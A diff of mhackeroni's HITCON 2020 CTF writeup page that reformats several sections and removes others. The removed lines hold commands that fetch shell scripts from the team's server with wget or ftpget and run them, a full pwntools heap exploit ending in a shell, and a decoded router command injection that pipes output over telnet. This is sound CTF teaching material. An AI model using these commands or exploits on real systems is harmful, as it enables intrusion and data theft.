@@ -7,400 +7,55 @@ comments: true
 This is the collection of writeups for HITCON 2020 by the mhackeroni team.
 
 Index
--------
-[welcome](#welcome) - [Revenge of Baby Shock](#revenge-of-baby-shock) - [Baby Shock](#baby-shock) - [L’Obscurité](http://www.babush.me/hitcon-ctf-2020-writeup.html) - [Telescope](#telescope) - [11011001](#11011001) - [SOP](#sop) - [Run Run Run](http://www.babush.me/hitcon-ctf-2020-writeup.html) - [AC1750](#ac1750) - [atoms](#atoms) - [Tenet](#tenet) - [dual](#dual) - [Revenge-of-Pwn](#revenge-of-pwn) - [sparks](#sparks) - [100 pins](#100-pins)
+-----
+
+- [Welcome](#welcome) - rev, 50pts, 715 solves
+- [11011001](#11011001) - rev, 255pts, 30 solves
+- [SOP](#sop) - rev, 305pts, 15 solves
+- [Run Run Run](#run-run-run) - rev, 315pts, 13 solves
+- [L'Obscurité](#lobscurité) - rev, 500pts, 1 solve
+- [Dual](#dual) - pwn, 288pts, 19 solves
+- [Spark](#spark) - pwn, 344pts, 10 solves
+- [Telescope](#telescope) - pwn, 384pts, 5 solves
+- [100 pins](#100-pins) - crypto, 350pts, 8 solves
+- [AC1750](#ac1750) - forensics, 168pts, 100 solves
+- [Baby Shock](#baby-shock) - misc, 201pts
+- [Revenge of Baby Shock](#revenge-of-baby-shock) - misc, 230pts, 42 solves
+- [Revenge of Pwn](#revenge-of-pwn) - misc/pwn, 255pts, 30 solves
+- [Atoms](#atoms) - misc/pwn, 296pts, 17 solves
+- [Tenet](#tenet) - misc/shellcode - 222pts, 47 solves
+
 #### [Comments section](#disqus_thread)
 
+Welcome
+-------
 
-welcome
---------
-It's a reverse challenge.
+> It's a reverse challenge.
+>
+> `ssh welcome@18.176.232.130 password: hitconctf`
 
-`ssh welcome@18.176.232.130
-password: hitconctf`
-
-
-## The challenge
+### The challenge
 
 The challenge is literally a reverse challenge. Every word in input is reversed:
-if we run `cat flag`
-we get
+
+If we run `cat flag` we get:
+
 ```
 tac: failed to open 'galf' for reading: No such file or directory
 ```
 
-# The solution
-If we run `tac galf`
+### The solution
 
-we get `hitcon{!0202 ftcnoctih ot emoclew}`.
-
-Which is the flag.
-
-Revenge of Baby Shock
---------
-`nc 18.178.60.6 1987`
-
-## The challenge
-
-It's identical to baby shock, but more characters are forbidden, including `;` and even a singke`.`
-
-# The solution
-
-One of the (very few) special characters allowed are `()`. With these, it's possible to declare functions.
-
-This means that we can do
-```bash
-> id () whoami
-> id
-whoami: unknown uid 1129
-```
-
-to redefine one of the allowed commands (in this case `id`) to a function that executes our desired command.
-
-Without the `.`, we couldn't use the same trick as before to execute the reverse shell, as wget by default saves the downloaded files as `index.html` (and to change that name, a flag starting with `-` is required).
-
-Luckily, the server was running busybox, which contains the `ftpget` utility, with the much simper syntax of `ftpget HOST LOCAL_FILE REMOTE_FILE`.
-
-So we run the following commands
-
-```bash
-id () ftpget 123456789 payload payload
-id
-```
-to download via FTP the payload file from our server with ip 123456789 (decimal encoded), which contain the command `/readFlag`
-
-and then
-```
-id () sh payload
-id
-```
-
-To execute it and read the flag, which is `hitcon{r3v3ng3_f0r_semic010n_4nd_th4nks}`
-
-Baby Shock
---------
-`nc 54.248.135.16 1986`
-
-## The challenge
-
-We can connect via netcat to a machine, which contains an extremely limited shell, where the only commands we can run are `pwd ls mkdir netstat sort printf exit help id mount df du find history touch
-` and (most of the) special characters are filtered
-
-# The solution
-
-For some reason, `;` is not filtered. This means that we can run any command by doing
-`id ; mycommand`, as long as mycommand does not contain special characters (such as `-`, so most flags are forbidden)
-
-Also, the `.` is restricted, and cannot appear more than once in a command.
-
-So first we execute
-```bash
-id ; wget 123456789
-```
-where 123456789 is the IP (encoded as decimal number) of a HTTP serve we control, that hosts an index.html containing shell commands
-
-We then execute it via the command
-
-```
-id ; sh index.html
-```
-
-Which allows us to explore the filesystem, and see that there is a `readFlag` binary in `/`.
-By executing it we get the flag `???`
-
-Telescope
---------
-category: pwn
-points: 384
-solved: 5
-
-> Look up in the sky ⇑
->
-> nc 13.112.193.37 8573
->
-> Note:
-> The service is running on Ubuntu 20.04
->
-> telescope-ae928e9f49db514cd0ac406a25cd8e149df8ddd971a229c8e3b4f46de397ea29.tar.gz
-
-
-## Challenge Releas Content
-
-|              file | comment                                             |
-| -----------------:| --------------------------------------------------- |
-|   telescope.proto | This is the description of the protocol of protobuf |
-|         telescope | the binary to exploit                               |
-| libprotobuf.so.17 | protobuf remote library                             |
-|         libc.so.6 | libc remote library                                 |
-
-
-
-## The Binary
-
-The binary is simple to understand is the classic few option CTF binary.
-It is possible to create read and modify heap chunks with an extra interesting option that is to interpret the bytes ad protobuf protocol.
-Chunks are saved on an array of 1024 elements in `.bss` called `slots`, and the corresponding size is saved on another array in `.bss` called `slot_sizes`.
-In particulare, there are 6 options:
-
-#### [1] Create chunk
-It asks you for the number of slots and the size. It makes a malloc of the given size, memset the chunk to zero, and store a pointer to the new chunk into `slots[<index>]` where `<index>` is also a parameter chosen by the user.
-It also set `slots_sizes[<index>]` to the corrisponding size.
-
-#### [2] Read data into a chunk
-It asks for a slots index and then lets you write inside the chunk. The amount of bytes that you can write is the number of the size saved into `slots_sizes`. Bytes are read singularly. There is no possibility of short-read (read fewer bytes than the size).
-
-#### [3] Free chunk
-It asks for a slot index. It calls `free` on the pointer stored at `slots[<index>]` .
-It stores 0 into `slots[<index>]`  and `slots_size[<index>]`
-
-#### [4] Protobuf unserialize and reserialize
-This is the most complicated option, and the only one that took a few hours to be completely understood.
-It asks for a slot index.
-It parses the content with the protobuf parser generating the `Telescope` object.
-It checks that the field `pass` of the `Telescope` object is equal to `0xDEADBEEF`. If the `pass` field is not correctly set, you get an abort.
-
-If you manage to pass this check, the program removes the field `pass`.
-It prints out the number of `lens` (the other field of `Telescope`).
-It serializes the new object to a string. It uses a `memcpy` to copy the new string (byte representation of the object) into the slot.
-
-#### [5] Prints the chunk
-It asks for an index. It prints out `slots_sizes[<index>]` bytes of `slots[<index>]`.
-
-#### [-] Exit
-Any other option exit the program.
-
-
-## ProtoBuf
-Protobuf is a nice library that lets you define structured data that can be serialized and read back. It is nice because it supports many languages and automatically generates code to handle these data.
-
-```ocaml=
-syntax = "proto2";
-
-message Telescope {
-    repeated int64 lens = 1;
-    optional int64 pass = 2;
-}
-```
-
-There are 2 fields in this object. `pass` is optional and need to be set to
-`0xDEADBEEF` because the code checks its value. `lens` is an array of integers. It can be empty or any size.
-
-It is vital to understand how the encoding of protobuf works.
-You can find details of the encoding on [protobuf documentation](https://developers.google.com/protocol-buffers/docs/encoding). The documentation is written very well and explains how the encoding is working way better than I will ever be able to do. If you want to understand the vulnerability, you need to read the documentation and understand the serialization types.
-
-Here I give you an example of a `Telescope` object is encoded:
-
-```
-\x08\x17\x08\x20\x10\x11
-```
-Protobuf encode the field and is type in one byte followed by the value `(field_number << 3) | wire_type`. If you want to encode field numeber 1 with type 0 you get `1 << 3 | 0 = 0x08`.
-In particular, the byte `\x08` represent the field `lens` while `\x10` is the field `pass`. In this paricular string we have 2 elements for `lens`: `\x08\x17` and `\x08\x20`. `\x10\x11` is instead the encoding of `pass`. Hence, when deserialized we will have `obj.lens = [0x17, 0x20] ` and `obj.pass = 0x11`.
-
-
-### Testing Protobuf
-I spent hours playing with protobuf serialization. It was evident to me (after a while playing CTF you develop an intuition on where the author wants you to look.) that the vulnerability was in encoding/decoding protobuf.
-I tried several things. I do not recall them all. I had a python and a c++ program that I can use as a decoder/encoder debug.
-Few intresting discovery that I recall. The order of elements does not matter. You can have few lens the a pass and other lens: `\x08\x17\x10\x11\x08\x20` is valid and still decode to `obj.lens = [0x17, 0x20] ` and `obj.pass = 0x11`
-
-You can have multiple instances for `pass`: `\x08\x17\x10\x11\x08\x20\x10\x11` is valid and still decode to `obj.lens = [0x17, 0x20] ` and `obj.pass = 0x11`.
-
-## The Vulnerability
-I discovered that there are at least 2 ways to encode repeated fields. The preferred way to encode a repeated field in protobuf is to have multiple instances of a field. In fact, if you serialize `obj.lens = [0x17, 0x20]` you get `\x08\x17\x08\x20`. Another "valid" way to encode a repeated field is to use [`Lenght'delimited` type](https://developers.google.com/protocol-buffers/docs/encoding). In this case `\x0a\x02\x17\x20` is still decoded as
-`obj.lens = [0x17, 0x20]`. In particular, `\x0a` is field number 1 with type 2 (`1 << 3 | 2 = 0x0a`). 0x0a is followed by the size of the content (2 bytes in this case). Then there is the encoding of multiple numbers. (N.B. the numbers are always encoded as [`Variant`](https://developers.google.com/protocol-buffers/docs/encoding), you can have any number not only single bytes).
-
-If you deserialize and the serialize back `\x0a\x02\x17\x20` you get the string `\x08\x17\x08\x20`. Both are 4 bytes, so this particular instance is not a problem.
-
-However, if you deserialize and serialize `\x0a\x02\x17\x20\x17`, you get back
-`\x08\x17\x08\x20\x08\x17`. The first string is 5 bytes; the second is 6 bytes. For every single byte that we add in the first string, we get 2 bytes in the second. This allows us to overflow a chunk.
-
-
-## The Exploit
-We have a heap overflow where we can easily control the last byte.
-We have arbitrary read and write in any chunk that we control.
-We have a list of .bss containing pointers to our chunks.
-This is an excellent candidate to do an [unsafe_unlink](https://github.com/shellphish/how2heap/blob/master/glibc_2.31/unsafe_unlink.c).
-
-Our exploit aims to exploit an unsafe_unlink to overwrite one of the pointers in `slots` to point to `slots`. This will allow us to arbitrarily change the pointer of a slot and have arbitrary read and arbitrary write primitives. With those primitives, we can read `.got` to leak libc and change the function `free` with function `system`. Please note that the binary is not `PIE` and is not `Full RELRO`.
-
-### The Unsafe Unlink
-
-This step aims to overwrite one of the pointers in `slots` with an address of `slots`. This is possible by exploiting the unlink function of libc.
-When eliminating a chunk from the free list, the unlink algorithm of libc will overwrite the previous chunk's forward ptr. We can exploit this write by faking that the previous chunk is on .bss.
-There are several checks in the libc that you need to meet to have unlink successfully. You can play with [how2heap]((https://github.com/shellphish/how2heap/blob/master/glibc_2.31/unsafe_unlink.c)) to understand those constraints.
-
-In practice, we create a fake chunk header 0x10 bytes below one valid chunk. (You can do this because 0x10 bytes below the header begins the data part of the chunk). We do an overflow from one chunk to another, changing the `PREV_IN_USE` bit from 1 to 0. We set the prev_size to be 0x10 byte less than the real one. When we free the second chunk, a `consolidate` is triggered, trying to merge multiple chunks, so our chunk is unlinked, causing the overwrite.
-
-
-
-### Allining the ~~Stars~~ Chunks
-To trigger the consolidate, we need our chunk to be contiguous to the top_chunk.
-The size of the chunk that we choose to make this attack is 0x458.
-Reason to choose this size:
-- It needs NOT to be a fastbin.
-- We need to be able to overwrite the prev_size filed.
-
-The prev_size fields are placed as the last 8 bytes of the chunks. `malloc(0x458)` will create a chunk of 0x460 bytes.
-
-In our exploit, we allocate 20 chunks of sizer 0x458. This will remove all the free chunks of that size.
-
-We allocate some `extra_sizes` (`0x410, 0x470, 0x13b0, 0x2010`). Those are chunk size that will be used by protobuf deserialize and serialize functions. The idea is to preallocate those chunks to avoid them from being between our attacked chunk and the top_chunk. If you wonder, we got the size with gdb by looking at which chunks were between our attacked chunk and the top_chunk.
-
-We allocate 3 chunks of size 0x460.
-The first chunk (`chunk_c`) is there as a used chunk. We need to consolidate only 2 chunks, so we use the first chunk as a barrier.
-The second chunk (`chunk_a`) is the chunk that we are using as a fake chunk and the chunk to do the overflow.
-The third (`chunk_b`) chunk is the chunk that will be overflown by over byte.
-
-After the allocation, we deallocate the extra_sizes chunk. Now they are available for the protobuf algorithm, and they will not interfere with our attack.
-
-### Arbitrary Read/Write
-
-With unsafe unlink, you can overwrite one of the pointers in `slots` and have that pointer pointing to `slots` as well.
-This will allow you to control any pointer with data that you want.
-
-To build a decent primitive arbitrary read-write. We made `slots[20]` pointing to `slots[21]`. And both were chunks allocated with size 8.
-By writing in `slots[20]` we set the `address` of our primitive. by reading-writing `slots[21]`, we exploit the read-write.
-
-With this primitive, we can, by reading the value of puts in .got, get a leak of libc. We can compute the position of the `system,` and we can substitute free in .got with the `system`.
-At this point, we just need to free a chunk which content is `/bin/sh\x00` to get a shell.
-
-
-### The script
-```python
-from pwn import *
-
-r = remote("13.112.193.37", 8573)
-
-def alloca_slot(slot, size):
-    assert(slot <= 0x400)
-    assert((size & 0x80000000) == 0)
-    r.sendline("1")
-    r.recvuntil("slot>\n")
-    r.sendline("%d" % slot)
-    r.recvuntil("size>\n")
-    r.sendline("%d" % size)
-
-def write_slot(slot, data):
-    assert(slot <= 0x400)
-    r.sendline("2")
-    r.recvuntil("slot>\n")
-    r.sendline("%d" % slot)
-    r.send(data)
-
-def free_slot(slot):
-    assert(slot <= 0x400)
-    r.sendline("3")
-    r.recvuntil("slot>\n")
-    r.sendline("%d" % slot)
-
-def parse_slot(slot):
-    assert(slot <= 0x400)
-    r.sendline("4")
-    r.recvuntil("slot>\n")
-    r.sendline("%d" % slot)
-
-
-def print_slot(slot):
-    assert(slot <= 0x400)
-    r.sendline("5")
-    r.recvuntil("slot>\n")
-    r.sendline("%d" % slot)
-    return r.recvuntil("op>\n")[:-4]
-
-
-
-# lens = b"\x41" * 40
-# data = b"\x10\xef\xfd\xb6\xf5\x0d" + b"\x0a"+bytes([len(lens),]) +  lens
-# print(data)
-
-
-overflow = b"\x0a\x0b\x41\x41\x41\x41\x41\x41\x41\x41\x41\x60"
-pass_data = b"\x10\xef\xfd\xb6\xf5\x0d"
-filling = b"\x08" * 1090 + b"\x0a\x02\x80\x08"
-
-data = pass_data + filling + overflow
-
-chunk_size = 0x458
-
-assert(len(data) == chunk_size)
-
-for i in range(0, 20):
-    alloca_slot(i, chunk_size)
-
-
-extra_sizes = [0x410, 0x470, 0x13b0, 0x2010]
-extra_space = i
-for i in range(extra_space, extra_space+len(extra_sizes)):
-    print("allocat_empy %d" % i )
-    alloca_slot(i, extra_sizes[i - extra_space] - 0x10)
-
-
-data = data.ljust(chunk_size, b"\x00")
-chunk_a = i + 1
-chunk_b = i + 2
-chunk_c = i + 3
-print("a: %d, b: %d" % (chunk_a, chunk_b))
-alloca_slot(chunk_c, chunk_size)
-alloca_slot(chunk_a, chunk_size)
-alloca_slot(chunk_b, chunk_size)
-
-for i in range(extra_space, extra_space+len(extra_sizes)):
-    print("free %d" % i )
-    free_slot(i)
-
-write_slot(chunk_a, data)
-s = print_slot(chunk_a)
-parse_slot(chunk_a)
-s2 = print_slot(chunk_a)
-
-slots_base = 0x409280
-
-addre_23 = slots_base + 23*8 # chunk_a
-
-new_chunk_a = p64(0x0) + p64(0x451) + p64(addre_23 - 0x18) + p64(addre_23 - 0x10) + p64(0) + p64(0) + b"c"*8 + b"d"*8 + b"e"*8
-new_chunk_a = new_chunk_a.ljust(0x450, b"B") + p64(0x450)
-# input("wait for write")
-write_slot(chunk_a, new_chunk_a)
-# input("wait for free")
-free_slot(chunk_b)
-
-slots_data = print_slot(chunk_a)
-puts_got = 0x4091A8
-
-alloca_slot(20, 8)
-alloca_slot(21, 8)
-# input("check chunka")
-payload =  p64(0x409328) + p64(puts_got)
-payload = payload.ljust(chunk_size, b"\x00")
-r.recvuntil("op>\n")
-write_slot(chunk_a, payload)
-
-
-context.log_level = "DEBUG"
-r.recvuntil("op>\n")
-puts_leak = u64(print_slot(21))
-libc_base = puts_leak - 0x875a0
-system_libc = libc_base + 0x55410
-free_got = 0x409128
-print("[!] puts_atlibc: %x" % puts_leak)
-print("[!] libc_base: %x" % libc_base)
-print("[!] libc_system: %x" % system_libc)
-
-write_slot(20, p64(free_got))
-write_slot(21, p64(system_libc))
-write_slot(1, b"/bin/sh".ljust(chunk_size, b"\x00"))
-r.sendline("3")
-r.recvuntil("slot>\n")
-r.sendline("1")
-
-r.interactive()
-
-```
+If we run `tac galf` we get `hitcon{!0202 ftcnoctih ot emoclew}`, which is the
+flag.
 
 
 11011001
 --------
 
-**Reverse - 255 pts**
+> 0100111001101111001000000110100001101001011011100111010000100000011010000110010101110010011001010010110000100000011101110110100001100001011101000010000001100001011100100110010100100000011110010110111101110101001000000110010101111000011100000110010101100011011101000110100101101110011001110010000001100110011011110111001000111111
+
+### The challenge
 
 We are given a C++ binary, which seems heavily optimized and decompiles like a
 mess. The binary wants 20 unsigned 32-bit integers as inputs and performs some
@@ -422,10 +77,12 @@ straightforward:
    exactly 10.
 
 There are also other checks made by the program, but we did not get reverse
-those, because in the meantime we were writing a simple Python solver using
+those, because in the meantime we we were writing a simple Python solver using
 [`z3`](https://pypi.org/project/z3-solver/), adding one check at the time and
 testing the result. After the 6th check above, our input got accepted by the
 program and it spit out the flag.
+
+### The solution
 
 Complete solution:
 
@@ -496,7 +153,9 @@ Here's your gift: hitcon{fd05b10812d764abd7d853dfd24dbe6769a701eecae079e7d26570e
 
 
 SOP
---------
+---
+
+> Let me introduce a brand new concept - Syscall Oriented Programming!
 
 The binary implements the typical fetch-execute loop in the `run` function:
 
@@ -510,15 +169,25 @@ while ( code[regs[15]] )
 }
 ```
 
-From this code we can also see that the VM allows up to 6 arguments for a given syscall and that it offers 16 64bit registers, the last of which is the instruction pointer. The custom instruction encoding can be extracted from the `fetch_inst` function, which was reimplemented in python to continue the analysis
+From this code we can also see that the VM allows up to 6 arguments for a given
+syscall and that it offers 16 64bit registers, the last of which is the
+instruction pointer. The custom instruction encoding can be extracted from the
+`fetch_inst` function, which was reimplemented in python to continue the
+analysis
 
-At a basic level, the VM executes a syscall for each opcode. Since the disassembly was over 2k lines long, we used some rules to simplify and shorten it. For example, a `mov reg, reg` instruction was implemented as a `set_tid_address <value>; prctl GET_TID_ADDRESS &<dest>`.
+At a basic level, the VM executes a syscall for each opcode. Since the
+disassembly was over 2k lines long, we used some rules to simplify and shorten
+it. For example, a `mov reg, reg` instruction was implemented as a
+`set_tid_address <value>; prctl GET_TID_ADDRESS &<dest>`.
 
 After this first step, the bytecode could be subdivided in four main parts:
 
-- At first, it loads some shellcode in memory and sets it as the SIGSYS handler, which can used by seccomp in response to filtered syscalls
-- Then, it prepares and loads a seccomp filter which intercepts a fixed set of syscalls, replacing them with custom actions
-- Next, it takes the user input (which was read at the start of the shellcode) and processes it
+- At first, it loads some shellcode in memory and sets it as the SIGSYS handler,
+  which can used by seccomp in response to filtered syscalls
+- Then, it prepares and loads a seccomp filter which intercepts a fixed set of
+  syscalls, replacing them with custom actions
+- Next, it takes the user input (which was read at the start of the shellcode)
+  and processes it
 - And finally, it prints a success message to an invalid file descriptor
 
 The logical next step was to analyze the shellcode and the seccomp filter:
@@ -540,9 +209,13 @@ The logical next step was to analyze the shellcode and the seccomp filter:
    4:    0f 05                    syscall
 ```
 
-The interesting part here is the sigaction handler: it takes the syscall return value, stores it at the address contained in `rcx` and increments that pointer by 2 by modifying the `movabs` instruction. Since the return value is 16 bits wide, by repeating this procedure twice we can obtain a full 32 bit result.
+The interesting part here is the sigaction handler: it takes the syscall return
+value, stores it at the address contained in `rcx` and increments that pointer
+by 2 by modifying the `movabs` instruction. Since the return value is 16 bits
+wide, by repeating this procedure twice we can obtain a full 32 bit result.
 
 The seccomp filter, extracted using `seccomp_tools`, is as follows:
+
 ```
  line  CODE  JT   JF      K
 =================================
@@ -583,15 +256,32 @@ The seccomp filter, extracted using `seccomp_tools`, is as follows:
  0070: 0x06 0x00 0x00 0x7fff0000  return ALLOW
 ```
 
-This filter is used to implement arithmetic operations in the bytecode by hooking unused syscalls. For example, a `getpgrp` syscall is used to multiply two numbers. Since the result is only 16 bits wide, each 32bit operation calls the required syscall twice, once with a shift (third argument) of 0 and once with a shift of 16.
+This filter is used to implement arithmetic operations in the bytecode by
+hooking unused syscalls. For example, a `getpgrp` syscall is used to multiply
+two numbers. Since the result is only 16 bits wide, each 32bit operation calls
+the required syscall twice, once with a shift (third argument) of 0 and once
+with a shift of 16.
 
-With the seccomp filter & handler reversed, it was now possible to apply more rules to the bytecode, reducing it to less than 600 instructions, of which most are the ones used to set up the filter itself, meaning that the unreversed part got reduced to roughly 300 lines.
+With the seccomp filter & handler reversed, it was now possible to apply more
+rules to the bytecode, reducing it to less than 600 instructions, of which most
+are the ones used to set up the filter itself, meaning that the unreversed part
+got reduced to roughly 300 lines.
 
-In the remaining code there were 4 repetitions of code that looked very similar and a final block that applies some final operations on the input and prints the success message. The 4 repetitions are all the same except for some constant values which are used, making it look very similar to some sort of encryption algorithm. In fact, by analyzing it further (with the help of an `strace` log of the binary with a known input for debugging) it was possible to reimplement the algorithm in C, revealing that it was some sort of 32-round feistel network.
+In the remaining code there were 4 repetitions of code that looked very similar
+and a final block that applies some final operations on the input and prints the
+success message. The 4 repetitions are all the same except for some constant
+values which are used, making it look very similar to some sort of encryption
+algorithm. In fact, by analyzing it further (with the help of an `strace` log of
+the binary with a known input for debugging) it was possible to reimplement the
+algorithm in C, revealing that it was some sort of 32-round feistel network.
 
-Any feistel round can be inverted if the output and key are known. Since the key was hardcoded in the bytecode, this meant that given an output it could be decrypted to get the flag.
+Any feistel round can be inverted if the output and key are known. Since the key
+was hardcoded in the bytecode, this meant that given an output it could be
+decrypted to get the flag.
 
-The last part of the bytecode, just before printing the final message, XORs each 4byte block of the encrypted flag with a constant value and calculates the OR of all the XORs:
+The last part of the bytecode, just before printing the final message, XORs each
+4byte block of the encrypted flag with a constant value and calculates the OR of
+all the XORs:
 
 ```
 strcpy &r9 0x217058
@@ -619,7 +309,9 @@ mov 0x0 r2
 r3 = r9 ^ 0x92012a14
 ```
 
-This meant that the final value would be 0 if and only if the encrypted flag was equal to those constants, and so those were the best candidates to try decryption on. Indeed, by concatenating and decrypting them, we got the flag.
+This meant that the final value would be 0 if and only if the encrypted flag was
+equal to those constants, and so those were the best candidates to try
+decryption on. Indeed, by concatenating and decrypting them, we got the flag.
 
 For reference, this is the decompiler code and the final decryption code:
 
@@ -920,779 +612,40 @@ int main() {
 ```
 
 
-AC1750
---------
-My router is weird, can you help me find the problem?
+Run run run
+-----------
 
+This writeup is available
+[**here**](http://www.babush.me/hitcon-ctf-2020-writeup.html).
 
-## The challenge
 
-We are given a PCAP file which contains some communication between a computer (a macbook pro) and a router (a TP-link AC1750)
+L'Obscurité
+-----------
 
+This writeup is available
+[**here**](http://www.babush.me/hitcon-ctf-2020-writeup.html).
 
-# The PCAP
 
-The PCAP can be divided into 3 main flows, one after the other:
-1. Some HTTP requests to the router web interface, which seems to be running some sort of OpenWRT, given the references to the LuCI API. Nothing too interesting here
-2. Some weird UDP traffic from the computer to port 20002 of the router which appears to be encrypted (high entropy, no recognizable strings)
-3. A TCP connection from the router to the computer on port 4321, which sends back the output of the `ls` command
+Dual
+----
 
+> Heap exploitation in Rust? Is there any hope? Yes if you implement your own
+> Garbage Collector.
 
-
-
-# UDP port 20002
-
-From a quick search on the internet, we find references to [CVE-2020-10882](https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2020-10882), which coincidentally affects the router we are communicating with.
-
-We were able to find [this extremely useful writeup](https://www.thezdi.com/blog/2020/4/6/exploiting-the-tp-link-archer-c7-at-pwn2own-tokyo) which explains the  details of the protocol, and of the vulnerability which causes RCE. TLDR (since it's what we care about): it communicates using packets containing a 32-byte header and a JSON encrypted with AES-128 CBC, with the fixed key `TPONEMESH_Kf!xn?` and IV `1234567890abcdef1234567890abcdef`.
-
-Without knowing anything else about the protocol (except that the injection point is in the slave_mac JSON key), we exported the UDP traffic from wireshark as JSON and wrote this quick python script:
-
-```python
-from Crypto.Cipher import AES
-
-def decrypt(packet_hex):
-	c = AES.new(b'TPONEMESH_Kf!xn?',AES.MODE_CBC,b'1234567890abcdef')
-	enc = bytearray.fromhex(packet_hex[32:])
-	return c.decrypt(enc)
-
-
-import json
-
-f = json.loads(open("traffic.json").read())
-for p in f:
-	try:
-		p = p['_source']['layers']['udp']['udp.payload'].replace(':',"") #because wireshark hexdump is stupid
-		print(json.loads(decrypt(p))['data']['slave_mac'][2:-1])
-	except Exception as e:
-		pass
-```
-
-Which, after a bit of cleaning, this returned
-```bash
-echo>f;
-printf '('>>f;
-printf 'l'>>f;
-printf 's'>>f;
-printf ' '>>f;
-printf '-'>>f;
-printf 'l'>>f;
-printf '&'>>f;
-printf '&'>>f;
-printf 'e'>>f;
-printf 'c'>>f;
-printf 'h'>>f;
-printf 'o'>>f;
-printf ' '>>f;
-printf 'h'>>f;
-printf 'i'>>f;
-printf 't'>>f;
-printf 'c'>>f;
-printf 'o'>>f;
-printf 'n'>>f;
-printf '{'>>f;
-printf 'W'>>f;
-printf 'h'>>f;
-printf 'y'>>f;
-printf '_'>>f;
-printf 'c'>>f;
-printf 'a'>>f;
-printf 'n'>>f;
-printf '_'>>f;
-printf 'o'>>f;
-printf 'n'>>f;
-printf 'e'>>f;
-printf '_'>>f;
-printf 'p'>>f;
-printf 'l'>>f;
-printf 'a'>>f;
-printf 'c'>>f;
-printf 'e'>>f;
-printf '_'>>f;
-printf 'b'>>f;
-printf 'e'>>f;
-printf '_'>>f;
-printf 'i'>>f;
-printf 'n'>>f;
-printf 'j'>>f;
-printf 'e'>>f;
-printf 'c'>>f;
-printf 't'>>f;
-printf 'e'>>f;
-printf 'd'>>f;
-printf '_'>>f;
-printf 't'>>f;
-printf 'w'>>f;
-printf 'i'>>f;
-printf 'c'>>f;
-printf 'e'>>f;
-printf '}'>>f;
-printf '>'>>f;
-printf 'f'>>f;
-printf 'l'>>f;
-printf 'a'>>f;
-printf 'g'>>f;
-printf '&'>>f;
-printf '&'>>f;
-printf 'l'>>f;
-printf 's'>>f;
-printf ' '>>f;
-printf '-'>>f;
-printf 'l'>>f;
-printf ')'>>f;
-printf '|'>>f;
-printf 't'>>f;
-printf 'e'>>f;
-printf 'l'>>f;
-printf 'n'>>f;
-printf 'e'>>f;
-printf 't'>>f;
-printf ' '>>f;
-printf '1'>>f;
-printf '9'>>f;
-printf '2'>>f;
-printf '.'>>f;
-printf '1'>>f;
-printf '6'>>f;
-printf '8'>>f;
-printf '.'>>f;
-printf '0'>>f;
-printf '.'>>f;
-printf '1'>>f;
-printf '0'>>f;
-printf '5'>>f;
-printf ' '>>f;
-printf '4'>>f;
-printf '3'>>f;
-printf '2'>>f;
-printf '1'>>f;
-sh f;
-
-```
-
-Which, when executed, creates the file `f` containining
-```bash
-(ls -l && echo hitcon{Why_can_one_place_be_injected_twice}>flag &&l s -l)|telnet 192.168.0.105 4321
-```
-
-Which contains the flag!
-
-atoms
---------
-category: misc/pwn
-points: 296
-solved: 17
-
-> A TOken-based Memory Storage.
->
-> nc 13.231.7.116 9427
->
-> atoms-22149cb3ad6bcb5d5d4213a70e11249a2188e9e4affa4b56387ab40f9d12748c.tar.gz
->
-
-### Challenge Release Content
-
-
-|              file | comment                                |
-| -----------------:| -------------------------------------- |
-|            run.sh | bash script to run the challenge       |
-|        linux.diff | a patch that was applied to the kernel |
-| initramfs.cpio.gz | the system (binaries, libraries, etc.) |
-|            demo.c | source code of the test module         |
-|              demo | a sample binary to test the module     |
-|           bzImage | the kernel                             |
-|          atoms.ko | the kernel module loaded on the system |
-
-### The Goal of the Challenge
-There was no flag file. The goal of the challenge was not standard. But looking at the released file was easy to understand the goal of the challenge.
-In particular, the `linux.diff` tells us that the flag is stored in the kernel's error messages.
-
-
-```diff=
-index 7110906..beeb01f 100644
---- a/kernel/watchdog.c
-+++ b/kernel/watchdog.c
-@@ -409,9 +409,12 @@ static enum hrtimer_restart watchdog_timer_fn(struct hrtimer *hrtimer)
- 			}
- 		}
-
-+#ifndef FLAG
-+ #define FLAG "hitcon{<FLAG WILL BE HERE>}"
-+#endif
- 		pr_emerg("BUG: soft lockup - CPU#%d stuck for %us! [%s:%d]\n",
- 			smp_processor_id(), duration,
--			current->comm, task_pid_nr(current));
-+			FLAG, task_pid_nr(current));
- 		print_modules();
- 		print_irqtrace_events(current);
- 		if (regs)
-
-```
-
-Looking at the kernel's [original source code](https://elixir.bootlin.com/linux/latest/source/kernel/watchdog.c#L341), we understood that the error is triggered if the core is stacked for a certain amount of time. In practice, you need to get the kernel module in deadlock.
-
-
-### The Kernel Module
-
-This kernel module (`atomos.ko`) is creating a new device file `/dev/atoms`.
-It easy to understand the basic functionality of the module from the demo source code.
-
-Practically, you can **open** the device file.
-```c
-  int fd = open(DEV_PATH, O_RDWR);
-```
-
-**Select/Create** storage indexed by a `key`.
-```c
-  ioctl(fd, ATOMS_USE_TOKEN, TOKEN)
-```
-**Allocate** space for you messages
-```c
-  struct atoms_ioctl_alloc arg = {
-    .size = 0x1000,
-  };
-  assert(ioctl(fd, ATOMS_ALLOC, &arg) == 0);
-```
-
-**Map** the storage to a userspace virtual address
-```c
-  void *ptr = mmap(0, 0x1000, PROT_WRITE, MAP_SHARED, fd, 0);
-```
-
-When memory is allocated in userspace, you can **read or write** it.
-```c
-  strcpy((char*)ptr, "the secret message left by parent");
-```
-
-**Remove** the storage from userspace.
-```c
-  munmap(ptr, 0x1000);
-```
-**Close** the file descriptor.
-```c
-  close(fd);
-```
-
-The `ioctl` function is the most interesting part. We spent some time to reverse engineer the details. There are 4 basic commands for `ioctl`.
-
-```
-ATOMS_USE_TOKEN    0x4008D900  // set the current pool to a token
-ATOMS_ALLOC        0xC010D902  // allocate memory for current pool
-ATOMS_RELEASE      0xD903      // clean up the pool
-ATOMS_INFO         0x8018D901  // return info about the current pool
-```
-The module internally has the concept of `pool`. A `pool` is identified by a `token` and contains the messages (memory pages) corresponding to a specific `token` The kernel has a global variable that is an array of pools. It can store up to 1024 pools.
-
-#### The Locks
-The module uses the kernel function `raw_spin_lock` to set up a lock on several resources.
-We identified three types of locks:
-**fd_lock**: This is a locking done on a file descriptor. The resource is stored in `priv_data` of the fd kernel structure.
-**pools_lock**: This lock is done when accessing the global variable array containing all the pools. This resource is stored as a global variable as well.
-**tk_lock**: A lock that is used to control access to a specific `pool`/`token`. This resource is store as part of the `pool` structure.
-
-#### The Ref Counter
-Internally, the `pool` is a structure that looks like this:
-```c=
